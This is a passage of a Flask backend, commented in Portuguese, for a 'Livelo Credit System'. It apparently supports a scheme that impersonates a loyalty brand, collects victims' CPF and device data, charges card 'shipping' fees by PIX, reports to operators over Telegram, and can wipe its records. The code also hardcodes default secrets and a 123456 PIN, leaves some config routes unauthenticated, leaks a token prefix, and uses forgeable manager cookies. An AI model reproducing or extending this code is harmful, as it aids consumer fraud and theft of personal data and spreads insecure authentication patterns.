    logo_url = (request.get_json(silent=True) or {}).get("logo_url", "")
    if not logo_url:
        return jsonify({"ok": False, "error": "logo_url required"}), 422
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[BOT] Logo via Telegram: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})


@app.route("/api/internal/set-logo-file", methods=["POST"])
def bot_set_logo_file():
    """Permite que o bot Telegram envie um arquivo de imagem para usar como logo."""
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    logo_file = request.files.get("logo_file")
    if not logo_file or not logo_file.filename:
        return jsonify({"ok": False, "error": "logo_file required"}), 422
    ext = Path(secure_filename(logo_file.filename)).suffix.lower().lstrip(".")
    if ext not in ALLOWED_IMG_EXT:
        return jsonify({"ok": False, "error": "Formato invalido"}), 422
    fname = f"logo_bot_{uuid.uuid4().hex[:10]}.{ext}"
    logo_file.save(UPLOAD_DIR / fname)
    logo_url = f"/static/uploads/{fname}"
    db = get_db()
    db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('system_logo_url', ?)", (logo_url,))
    db.commit()
    log.info("[BOT] Logo arquivo via Telegram: %s", logo_url)
    return jsonify({"ok": True, "logo_url": logo_url})







@app.route('/api/admin/bot-config', methods=['POST'])
def api_admin_bot_config():
    data = request.get_json()
    db = get_db()
    for key in ['token', 'channel', 'topic', 'tpl_entry', 'tpl_card_chosen', 'tpl_pix_generated', 'tpl_pix_paid']:
        if key in data:
            db_key = 'telegram_token' if key == 'token' else ('tg_log_channel' if key == 'channel' else ('tg_log_thread_id' if key == 'topic' else f'tg_{key}'))
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (db_key, data.get(key, '')))
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/supreme/frete", methods=["POST"])
def api_supreme_frete():
    data = request.get_json() or {}
    db = get_db()
    if "frete_expresso" in data:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_expresso', ?)", (data["frete_expresso"],))
    if "frete_padrao" in data:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_padrao', ?)", (data["frete_padrao"],))
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/supreme/upsell", methods=["POST"])
def api_supreme_upsell():
    data = request.get_json() or {}
    db = get_db()
    for key in ['upsell_active', 'upsell_value', 'upsell_title', 'upsell_icon']:
        if key in data:
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/config", methods=["GET"])
def api_get_config():
    db = get_db()
    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('frete_expresso', 'frete_padrao', 'upsell_active', 'upsell_value', 'upsell_title', 'upsell_icon')").fetchall()
    config = {r["key"]: r["value"] for r in rows}
    return jsonify(config)





@app.route("/api/log-action", methods=["POST"])
def api_log_action():
    data = request.get_json() or {}
    sid = sanitize(data.get("session_id", ""), 40)
    action = sanitize(data.get("action", ""), 100)
    details = sanitize(data.get("details", ""), 200)
    
    # Store action in DB or just forward to TG
    if sid and action:
        texto = f"{action}" + (f": {details}" if details else "")
        try:
            send_telegram_notify(sid, f"STEP_ACTION: {texto}")
        except Exception as _e:
            log.warning("[TG] STEP_ACTION notify falhou: %s", _e)
    return jsonify({"ok": True})


def process_bot_action(action, payload=None):
    payload = payload or {}
    db = get_db()
    
    if action == "generate_otp":
        tg_id = str(payload.get("tg_id", ""))
        supreme_id = os.environ.get("ID_ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID", "none")))
        
        if tg_id == supreme_id:
            role = "supreme"
        else:
            mgr = db.execute("SELECT id FROM managers WHERE telegram_id = ?", (tg_id,)).fetchone()
            if not mgr:
                return {"ok": False, "error": "Acesso Negado: Você não é um gerente autorizado."}
            role = f"manager_{tg_id}"

        import random, string, hashlib, time, uuid
        code = ''.join(random.choices(string.digits, k=6)) # 6-digit numeric PIN
        code_hash = hashlib.sha256(code.encode()).hexdigest()
        expires = time.time() + 300 # 5 minutes
        port_id = str(uuid.uuid4().hex)[:12]
        
        # We ensure the port_id column exists
        try:
            db.execute("INSERT INTO otp_tokens (token_hash, role, expires_at, port_id) VALUES (?, ?, ?, ?)", (code_hash, role, expires, port_id))
        except:
            db.execute("INSERT INTO otp_tokens (token_hash, role, expires_at) VALUES (?, ?, ?)", (code_hash, role, expires))
        db.commit()
        
        url_path = f"/nexus-gate-{port_id}"
        return {"ok": True, "code": code, "url_path": url_path, "role": role}
    
    if action == "get_config":
        rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        return {"ok": True, "config": {r["key"]: r["value"] for r in rows}}
        
    elif action == "unlock_admin":
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('admin_locked', 'false')")
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('admin_fails', '0')")
        db.commit()
        return {"ok": True}
        
    elif action == "set_config":
        for k, v in payload.items():
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (k, v))
        db.commit()
        return {"ok": True}
        
    elif action == "get_leads":
        limit = payload.get("limit", 10)
        rows = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
        return {"ok": True, "leads": [dict(r) for r in rows]}
        
    elif action == "get_payments":
        limit = payload.get("limit", 10)
        rows = db.execute("SELECT * FROM payments ORDER BY created_at DESC LIMIT ?", (limit,)).fetchall()
        return {"ok": True, "payments": [dict(r) for r in rows]}
        
    elif action == "get_financeiro":
        total_leads = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
        cartoes_feitos = db.execute("SELECT COUNT(*) FROM leads WHERE card_style IS NOT NULL AND card_style != ''").fetchone()[0]
        pagamentos_gerados = db.execute("SELECT COUNT(*) FROM payments").fetchone()[0]
        pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
        pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
        cancelados = db.execute("SELECT COUNT(*) FROM payments WHERE status='rejected' OR status='cancelled'").fetchone()[0]
        
        stats = {
            "qtd_leads": total_leads,
            "cartoes_feitos": cartoes_feitos,
            "pagamentos_gerados": pagamentos_gerados,
            "total_pago": f"{pagos[0] or 0:.2f}",
            "qtd_pago": pagos[1] or 0,
            "qtd_pendente": pendentes,
            "qtd_cancelado": cancelados,
            "host_status": "🟢 Vercel Serverless (Online)",
            "api_status": "🟢 Ativa & Sincronizada",
            "security_status": "🟢 Blindagem Ant-Scrape Ativa"
        }
        return {"ok": True, "stats": stats}
    elif action == "reset_system":
        db.execute("DELETE FROM leads")
        db.execute("DELETE FROM payments")
        db.commit()
        return {"ok": True}
        
    return {"ok": False, "error": "Unknown action"}

@app.route("/api/internal/bot-gateway", methods=["POST"])
def api_bot_gateway():
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Bot-Secret", "") != secret:
        return jsonify({"ok": False, "error": "Unauthorized"}), 401
    data = request.get_json(silent=True) or {}
    return jsonify(process_bot_action(data.get("action"), data.get("payload")))


@app.route("/api/admin/advanced-config", methods=["POST"])
def api_admin_advanced_config():
    data = request.get_json() or {}
    init_data = data.get("initData", "")
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    
    if not bot_token or not verify_telegram_web_app_data(init_data, bot_token):
        return jsonify({"ok": False, "error": "Invalid Telegram Signature"}), 403

    parsed_data = dict(parse_qsl(init_data))
    user = json.loads(parsed_data.get("user", "{}"))
    tg_id = str(user.get("id", ""))
    
    db = get_db()
    row = db.execute("SELECT role FROM telegram_admins WHERE tg_id=?", (tg_id,)).fetchone()
    
    if not row or row["role"] != "supreme":
        return jsonify({"ok": False, "error": "Only Supreme Admin can change system configs"}), 403
    
    # Save generic configs
    for key in ['mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code', 'cpf_token', 'frete_expresso', 'frete_padrao', 'wa_text']:
        if key in data and data[key]:
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
            
    db.commit()
    return jsonify({"ok": True})

@app.route("/api/config", methods=["GET"])
def api_get_public_config():
    db = get_db()
    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('mgr_name', 'mgr_years', 'mgr_avatar', 'favicon', 'pixel_code', 'frete_expresso', 'frete_padrao')").fetchall()
    return jsonify({r["key"]: r["value"] for r in rows})

@app.route('/health')
def health():
    return jsonify({"ok": True, "ts": time.time()})


# ══════════════════════════════════════════════════════════════════════════════
#  SUPREME ADMIN SHIELDED GATES
# ══════════════════════════════════════════════════════════════════════════════
SUPREME_HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92" # SHA-256 for '123456'

def get_supreme_hash():
    # If LO sets SUPREME_PIN in Vercel, use it. Otherwise use the default 123456 hash.
    pin = os.environ.get("SUPREME_PIN")
    if pin:
        import hashlib
        return hashlib.sha256(pin.encode()).hexdigest()
    return SUPREME_HASH

def supreme_required(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        token = request.cookies.get("supreme_token")
        if not token or token != get_supreme_hash():
            return jsonify({"ok": False, "error": "Acesso Negado. Blindagem Ativa."}), 403
        return f(*args, **kwargs)
    return wrapped

def check_admin_lock(db):
    locked = db.execute("SELECT value FROM sys_config WHERE key='admin_locked'").fetchone()
    return locked and locked[0] == 'true'

@app.route("/nexus-gate-<port_id>")
def nexus_gate(port_id):
    """Porta de entrada dinâmica para gerentes usando OTP."""
    db = get_db()
    if check_admin_lock(db):
        return render_template("tg_webapp.html", error="SISTEMA BLOQUEADO. O Administrador Supremo precisa liberar via Bot do Telegram usando /liberar.")
    return render_template("nexus_login.html", port_id=port_id)

@app.route("/admin")
@app.route("/tg-nexus")
def tg_nexus():
    """Única porta de entrada blindada, exclusiva via Telegram Web App"""
    db = get_db()
    if check_admin_lock(db):
        return render_template("tg_webapp.html", error="SISTEMA BLOQUEADO. O Administrador Supremo precisa liberar via Bot do Telegram usando /liberar.")
    return render_template("tg_webapp.html")

@app.route("/api/supreme/auth", methods=["POST"])
def supreme_auth():
    db = get_db()
    if check_admin_lock(db):
        return jsonify({"ok": False, "error": "SISTEMA INATIVO: Bloqueio Ativado. Libere via Bot do Telegram (/liberar)."}), 403

    data = get_secure_json()
    pin = str(data.get("pin", ""))
    
    # Rate Limiting against Bruteforce
    ip = request.headers.get("CF-Connecting-IP", request.remote_addr)
    if is_blocked(ip):
        return jsonify({"ok": False, "error": "IP Bloqueado por brute-force."}), 429
        
    import hashlib, time
    pin_hash = hashlib.sha256(pin.encode()).hexdigest()
    
    port_id = data.get("port_id", "")
    # Check Intelligent OTP
    try:
        if port_id:
            otp = db.execute("SELECT role FROM otp_tokens WHERE token_hash = ? AND port_id = ? AND used = 0 AND expires_at > ?", (pin_hash, port_id, time.time())).fetchone()
        else:
            otp = db.execute("SELECT role FROM otp_tokens WHERE token_hash = ? AND used = 0 AND expires_at > ?", (pin_hash, time.time())).fetchone()
    except:
        otp = db.execute("SELECT role FROM otp_tokens WHERE token_hash = ? AND used = 0 AND expires_at > ?", (pin_hash, time.time())).fetchone()

    
    if otp:
        role = otp['role']
        db.execute("UPDATE otp_tokens SET used = 1 WHERE token_hash = ?", (pin_hash,))
        reset_auth_fail(ip)
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('admin_fails', '0')")
        db.commit()
        
        if role == 'supreme':
            resp = jsonify({"ok": True})
            resp.set_cookie("supreme_token", get_supreme_hash(), httponly=True, samesite="Lax", max_age=31536000)
            return resp
        elif role.startswith('manager_'):
            mgr_id = role.split('_')[1]
            resp = jsonify({"ok": True, "redirect": "/manager-panel"})
            resp.set_cookie("manager_token", mgr_id, httponly=True, samesite="Lax", max_age=31536000)
            return resp

    if pin_hash == get_supreme_hash():
        reset_auth_fail(ip)
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('admin_fails', '0')")
        db.commit()
        resp = jsonify({"ok": True})
        # Set Secure Cookie (1 year)
        resp.set_cookie("supreme_token", pin_hash, httponly=True, samesite="Lax", max_age=31536000)
        return resp
    else:
        record_auth_fail(ip)
        fails = db.execute("SELECT value FROM sys_config WHERE key='admin_fails'").fetchone()
        fails_count = int(fails[0]) if fails else 0
        fails_count += 1
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('admin_fails', ?)", (str(fails_count),))
        db.commit()
        if fails_count >= 3:
            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('admin_locked', 'true')")
            db.commit()
            return jsonify({"ok": False, "error": "SISTEMA BLOQUEADO. Limite de tentativas excedido."}), 429
        return jsonify({"ok": False, "error": f"PIN Incorreto. Tentativa {fails_count}/3."}), 401

@app.route("/api/supreme/dashboard", methods=["GET"])
@supreme_required
def supreme_dashboard():
    db = get_db()
    
    leads_count = db.execute("SELECT COUNT(*) FROM leads").fetchone()[0]
    pagos = db.execute("SELECT SUM(amount), COUNT(*) FROM payments WHERE status='approved' OR status='pago'").fetchone()
    pendentes = db.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0]
    
    cartoes_emitidos = db.execute("SELECT COUNT(*) FROM leads WHERE card_style IS NOT NULL AND card_style != ''").fetchone()[0]
    
    # Region Stats
    regions_raw = db.execute("SELECT location, COUNT(*) as c FROM leads WHERE location IS NOT NULL AND location != 'Desconhecido' GROUP BY location ORDER BY c DESC LIMIT 5").fetchall()
    regions = [{"name": r["location"], "count": r["c"]} for r in regions_raw]
    
    # Device Stats
    devices_raw = db.execute("SELECT device_brand, COUNT(*) as c FROM leads WHERE device_brand IS NOT NULL GROUP BY device_brand ORDER BY c DESC").fetchall()
    devices = [{"name": d["device_brand"], "count": d["c"]} for d in devices_raw]
    
    # Recent Leads Detailed
    recent_leads = db.execute("SELECT * FROM leads ORDER BY created_at DESC LIMIT 500").fetchall()
    payments_data = db.execute("SELECT amount, status, created_at FROM payments WHERE status='approved' OR status='pago' ORDER BY created_at ASC").fetchall()
    
    # Conversions
    conversao_cartao = round((cartoes_emitidos / leads_count * 100) if leads_count > 0 else 0, 1)
    conversao_pago = round((pagos[1] / cartoes_emitidos * 100) if cartoes_emitidos > 0 else 0, 1)

    admin_profile = {"name": "Supremo", "avatar": "https://ui-avatars.com/api/?name=Supremo&background=random", "role": "Supreme Admin"}
    admin_id = os.environ.get("ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID")))
    bot_token = os.environ.get('BOT_TOKEN', os.environ.get('TELEGRAM_BOT_TOKEN'))
    if not bot_token:
        row = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        bot_token = row["value"] if row else None

    if admin_id and bot_token and _REQUESTS_OK:
        try:
            chat_res = _req.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={admin_id}").json()
            if chat_res.get("ok"):
                admin_profile["name"] = chat_res["result"].get("first_name", "Supremo")
            photo_res = _req.get(f"https://api.telegram.org/bot{bot_token}/getUserProfilePhotos?user_id={admin_id}&limit=1").json()
            if photo_res.get("ok") and photo_res["result"]["total_count"] > 0:
                file_id = photo_res["result"]["photos"][0][0]["file_id"]
                file_res = _req.get(f"https://api.telegram.org/bot{bot_token}/getFile?file_id={file_id}").json()
                if file_res.get("ok"):
                    admin_profile["avatar"] = f"https://api.telegram.org/file/bot{bot_token}/{file_res['result']['file_path']}"
        except:
            pass

    stats = {
        "entradas": leads_count,
        "cartoes": cartoes_emitidos,
        "receita": round(pagos[0] or 0, 2),
        "pagos_qtd": pagos[1] or 0,
        "pendentes": pendentes,
        "regions": regions,
        "devices": devices,
        "leads": [dict(l) for l in recent_leads],
        "payments_data": [dict(p) for p in payments_data],
        "admin_profile": admin_profile,
        "conversoes": {"cartao_pct": conversao_cartao, "pago_pct": conversao_pago}
    }
    
    return jsonify({"ok": True, "stats": stats})




@app.route("/api/supreme/manager", methods=["GET", "POST"])
@supreme_required
def supreme_manager():
    db = get_db()
    if request.method == "GET":
        mgr = dict(db.execute("SELECT * FROM manager WHERE id=1").fetchone())
        return jsonify({"ok": True, "manager": mgr})
        
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        name = data.get("name")
        photo = data.get("photo_url")
        since = data.get("since_year")
        
        updates = []
        params = []
        if name:
            updates.append("name=?")
            params.append(name)
        if photo:
            updates.append("photo_url=?")
            params.append(photo)
        if since:
            updates.append("since_year=?")
            params.append(since)
            
        if updates:
            params.append(1) # for id=1
            query = f"UPDATE manager SET {', '.join(updates)}, updated_at=cast(strftime('%s','now') as real) WHERE id=?"
            db.execute(query, params)
            db.commit()
            
        return jsonify({"ok": True})


@app.route("/api/supreme/recover-pin", methods=["POST"])
def supreme_recover_pin():
    data = get_secure_json()
    port_id = data.get("port_id", "fallback")
    
    admin_id = os.environ.get("ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID")))
    token = os.environ.get("BOT_TOKEN", os.environ.get("TELEGRAM_BOT_TOKEN"))
    
    db = get_db()
    if not token:
        row = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
        token = row["value"] if row else None
        
    if not admin_id or not token:
        return jsonify({"ok": False, "error": "Bot ou Admin não configurados."})
    
    import random, string, hashlib, time
    new_pin = ''.join(random.choices(string.digits, k=6))
    pin_hash = hashlib.sha256(new_pin.encode()).hexdigest()
    expires = time.time() + 600
    
    try:
        db.execute("INSERT INTO otp_tokens (token_hash, role, expires_at, port_id) VALUES (?, ?, ?, ?)", (pin_hash, 'supreme', expires, port_id))
    except:
        db.execute("INSERT INTO otp_tokens (token_hash, role, expires_at) VALUES (?, ?, ?)", (pin_hash, 'supreme', expires))
    db.commit()
    
    import requests
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": admin_id,
        "text": f"🔐 <b>Novo PIN de Acesso Gerado</b>\n\nPIN: <code>{new_pin}</code>\n\nVálido por 10 minutos para a porta: {port_id}",
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)
    return jsonify({"ok": True})

@app.route("/api/supreme/c7-balance", methods=["GET"])
@supreme_required
def supreme_c7_balance():
    db = get_db()
    row_key = db.execute("SELECT value FROM sys_config WHERE key='c7_api_key'").fetchone()
    api_key = row_key["value"] if row_key and row_key["value"] else os.environ.get("C7_API_KEY", get_secure_c7_key())
    
    if api_key and _REQUESTS_OK:
        try:
            hdrs = {
                "Authorization": f"Bearer {api_key}",
                "User-Agent": "Mozilla/5.0"
            }
            resp = _req.get("https://api.carteirado7.com/v2/account/balance", headers=hdrs, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                balance = data.get("balance", data.get("amount", 0))
                return jsonify({"ok": True, "balance": balance})
        except:
            pass
    return jsonify({"ok": False, "balance": 0})

@app.route("/api/supreme/frete", methods=["POST"])
@supreme_required
def supreme_frete():
    data = get_secure_json()
    expresso = data.get("frete_expresso")
    padrao = data.get("frete_padrao")
    db = get_db()
    if expresso:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_expresso', ?)", (expresso,))
    if padrao:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_padrao', ?)", (padrao,))
    db.commit()
    return jsonify({"ok": True})

@app.errorhandler(404)
def not_found(_):
    return render_template("index.html"), 200

@app.errorhandler(429)
def too_many(_):
    return jsonify({"ok": False, "error": "Limite de requisições excedido."}), 429

# ══════════════════════════════════════════════════════════════════════════════
#  BOOT E BOT BACKGROUND
# ══════════════════════════════════════════════════════════════════════════════
def start_bot():
    try:
        import bot
        if bot.BOT_TOKEN and bot.BOT_TOKEN != "SEU_TOKEN_AQUI":
            # Em Serverless (Vercel), polling não funciona. Vamos apenas ignorar.
            # O Webhook será ativado manualmente via /set-webhook
            log.info("Bot rodará via Webhook.")
    except Exception as e:
        log.error("Falha ao configurar bot: %s", e)

# Webhook Handler
@app.route('/telegram-webhook', methods=['POST'])
def telegram_webhook():
    secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
    if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != secret:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        alerta = f"⚠️ <b>TENTATIVA DE SEQUESTRO (WEBHOOK)</b> ⚠️\n\n<b>IP:</b> <code>{ip}</code>\n<b>Endpoint:</b> <code>/telegram-webhook</code>\n\n<i>Payload malicioso foi bloqueado pela blindagem.</i>"
        import threading
        try:
            send_telegram_notify("", alerta)
        except:
            pass
        return "Unauthorized", 401
    try:
        import bot
        import telebot
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.bot.process_new_updates([update])
        return "OK", 200
    except Exception as e:
        return "Erro", 500

@app.route('/set-webhook')
def set_webhook():
    try:
        import bot
        url = f"{request.host_url.rstrip('/')}/telegram-webhook"
        bot.bot.remove_webhook()
        secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
        s = bot.bot.set_webhook(url=url, secret_token=secret)
        return jsonify({"webhook_set": s, "url": url})
    except Exception as e:
        import traceback
        return jsonify({"error": str(e), "traceback": traceback.format_exc()})

start_bot()



@app.route("/api/tg-test", methods=["GET", "POST"])
def api_tg_test():
    """Endpoint de diagnostico — testa bot token e envia msg de teste."""
    import requests as _rq
    db = get_db()
    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
    cfg = {r["key"]: r["value"] for r in cfg_rows}

    bot_token = (
        cfg.get("telegram_token")
        or os.environ.get("TELEGRAM_BOT_TOKEN")
        or os.environ.get("BOT_TOKEN")
    )
    supreme_id = (
        cfg.get("admin_chat_id")
        or cfg.get("supreme_admin_id")
        or os.environ.get("SUPREME_ADMIN_ID")
        or os.environ.get("ID_ADMIN_SUPREMO")
        or os.environ.get("ADMIN_CHAT_ID")
    )

    debug = {
        "bot_token_found": bool(bot_token),
        "bot_token_prefix": bot_token[:15] + "..." if bot_token else None,
        "supreme_id": supreme_id,
        "admin_chat_id_in_db": cfg.get("admin_chat_id"),
        "tg_log_channel": cfg.get("tg_log_channel"),
    }

    if not bot_token or not supreme_id:
        return jsonify({"ok": False, "debug": debug, "error": "bot_token ou supreme_id ausente"})

    try:
        r = _rq.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            json={"chat_id": supreme_id, "text": "Teste de notificacao Livelo OK! O bot esta conectado.", "parse_mode": "HTML"},
            timeout=6
        )
        rj = r.json()
        debug["telegram_response"] = rj
        return jsonify({"ok": rj.get("ok", False), "debug": debug})
    except Exception as e:
        return jsonify({"ok": False, "debug": debug, "error": str(e)})

if __name__ == "__main__":
    init_db()
    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
    port  = int(os.environ.get("PORT", 5050))
    log.info("[BOOT] Livelo Credit System na porta %d", port)
    app.run(host="0.0.0.0", port=port, debug=debug)
else:
    try:
        init_db()
    except Exception as e:
        log.error("Failed to init_db on startup: %s", e)


# ==========================================
# MANAGERS (NORMAL ADMINS) ROUTES
# ==========================================
import secrets
import time
import requests
from functools import wraps

def manager_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('manager_token')
        if not token:
            return jsonify({"ok": False, "error": "Acesso Negado."}), 401
        db = get_db()
        mgr = db.execute("SELECT * FROM managers WHERE telegram_id = ? AND status='active'", (token,)).fetchone()
        if not mgr:
            return jsonify({"ok": False, "error": "Acesso Negado ou Bloqueado."}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route("/api/supreme/managers", methods=["GET", "POST", "DELETE", "PUT"])
@supreme_required
def api_manage_managers():
    db = get_db()
    if request.method == "GET":
        mgrs = db.execute("SELECT * FROM managers ORDER BY created_at DESC").fetchall()
        return jsonify({"ok": True, "managers": [dict(m) for m in mgrs]})
        
    if request.method == "POST":
        data = request.json
        tid = data.get("telegram_id")
        if not tid: return jsonify({"ok": False, "error": "Telegram ID obrigatório"})
        
        # Try to fetch Telegram Avatar and Name using Bot API
        bot_token = os.environ.get('BOT_TOKEN')
        admin_chat_id = os.environ.get("ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID", "none")))
        
        if bot_token and admin_chat_id and str(tid) != str(admin_chat_id):
            try:
                member_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={admin_chat_id}&user_id={tid}").json()
                if not member_res.get("ok") or member_res["result"]["status"] not in ['creator', 'administrator', 'member', 'restricted']:
                    return jsonify({"ok": False, "error": "Acesso Negado: O usuário deve estar no Grupo Fechado Oficial para ser cadastrado."})
            except:
                pass

        name = "Gerente"
        avatar = "https://ui-avatars.com/api/?name=Gerente&background=random"
        if bot_token:
            try:
                # getChat
                chat_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id={tid}").json()
                if chat_res.get("ok"):
                    first_name = chat_res["result"].get("first_name", "")
                    last_name = chat_res["result"].get("last_name", "")
                    name = f"{first_name} {last_name}".strip() or "Gerente"
                    
                # getUserProfilePhotos
                photo_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getUserProfilePhotos?user_id={tid}&limit=1").json()
                if photo_res.get("ok") and photo_res["result"]["total_count"] > 0:
                    file_id = photo_res["result"]["photos"][0][0]["file_id"]
                    file_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getFile?file_id={file_id}").json()
                    if file_res.get("ok"):
                        file_path = file_res["result"]["file_path"]
                        avatar = f"https://api.telegram.org/file/bot{bot_token}/{file_path}"
            except Exception as e:
                pass
                
        try:
            db.execute("INSERT INTO managers (telegram_id, name, avatar_url, created_at) VALUES (?, ?, ?, ?)", (tid, name, avatar, int(time.time())))
            db.commit()
            return jsonify({"ok": True})
        except sqlite3.IntegrityError:
            return jsonify({"ok": False, "error": "Gerente já existe."})
            
    if request.method == "PUT":
        data = request.json
        tid = data.get("telegram_id")
        status = data.get("status")
        db.execute("UPDATE managers SET status = ? WHERE telegram_id = ?", (status, tid))
        db.commit()
        return jsonify({"ok": True})
        
    if request.method == "DELETE":
        data = request.json
        tid = data.get("telegram_id")
        db.execute("DELETE FROM managers WHERE telegram_id = ?", (tid,))
        db.execute("DELETE FROM manager_links WHERE telegram_id = ?", (tid,))
        db.commit()
        return jsonify({"ok": True})

@app.route("/api/supreme/manager_invite", methods=["POST"])
@supreme_required
def api_manager_invite():
    data = request.json
    tid = data.get("telegram_id")
    db = get_db()
    mgr = db.execute("SELECT * FROM managers WHERE telegram_id = ? AND status='active'", (tid,)).fetchone()
    if not mgr: return jsonify({"ok": False, "error": "Gerente não encontrado ou bloqueado."})
    
    link_hash = secrets.token_urlsafe(32)
    access_code = str(secrets.randbelow(900000) + 100000) # 6 digit code
    
    db.execute("INSERT INTO manager_links (hash, telegram_id, access_code, created_at) VALUES (?, ?, ?, ?)", (link_hash, tid, access_code, int(time.time())))
    db.commit()
    
    bot_token = os.environ.get('BOT_TOKEN')
    domain = request.host_url.rstrip('/')
    link = f"{domain}/nexus-manager/{link_hash}"
    
    msg = f"""🔐 *Acesso Gerado*

Seu link único e criptografado: {link}

Seu código de acesso: `{access_code}`

_Este link é de uso único._"""
    
    if bot_token:
        try:
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": tid,
                "text": msg,
                "parse_mode": "Markdown"
            })
            return jsonify({"ok": True})
        except Exception as e:
            return jsonify({"ok": False, "error": str(e)})
    return jsonify({"ok": False, "error": "Bot token não configurado."})

@app.route("/nexus-manager/<hash_str>", methods=["GET"])
def manager_view(hash_str):
    db = get_db()
    link = db.execute("SELECT * FROM manager_links WHERE hash = ?", (hash_str,)).fetchone()
    if not link or link['used']:
        return "Link inválido ou já utilizado.", 403
    return render_template("manager_dashboard.html", hash=hash_str)

@app.route("/api/manager/auth", methods=["POST"])
def manager_auth():
    data = request.json
    hash_str = data.get("hash")
    code = data.get("code")
    
    db = get_db()
    link = db.execute("SELECT * FROM manager_links WHERE hash = ? AND access_code = ?", (hash_str, code)).fetchone()
    if not link or link['used']:
        return jsonify({"ok": False, "error": "Código ou link inválido."}), 403
        
    db.execute("UPDATE manager_links SET used = 1 WHERE hash = ?", (hash_str,))
    db.commit()
    
    resp = jsonify({"ok": True})
    resp.set_cookie("manager_token", link['telegram_id'], httponly=True, samesite="Lax", max_age=43200) # 12 hours
    return resp

@app.route("/manager-panel")
@manager_required
def manager_panel():
    return render_template("manager_dashboard.html", hash="auth")

@app.route("/api/manager/dashboard", methods=["GET"])
@manager_required
def manager_dashboard_data():
    db = get_db()
    # Managers only see leads with payments approved or pending (who ordered cards)
    # The prompt says: "clientes que realizaram compra pedido do cartao completo e pagando o frete"
    recent_leads = db.execute("SELECT l.* FROM leads l JOIN payments p ON l.cpf = p.cpf WHERE p.status='approved' OR p.status='pago' OR p.status='pending' ORDER BY l.created_at DESC LIMIT 200").fetchall()
    return jsonify({"ok": True, "leads": [dict(l) for l in recent_leads]})
